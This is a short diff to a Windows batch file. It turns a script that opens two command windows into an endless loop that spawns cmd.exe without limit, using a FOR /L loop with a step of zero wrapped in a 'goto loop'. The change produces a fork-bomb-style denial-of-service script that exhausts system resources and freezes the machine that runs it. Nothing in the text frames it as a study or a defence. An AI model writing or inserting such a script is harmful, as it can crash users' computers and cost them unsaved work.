@@ -1,4 +1,6 @@
 @echo off
-FOR /L %%A IN (1,1,2) DO ( 
-start cmd.exe
+:loop
+FOR /L %%A IN (1, 0, 1) DO (
+    start cmd.exe
 )
+goto loop
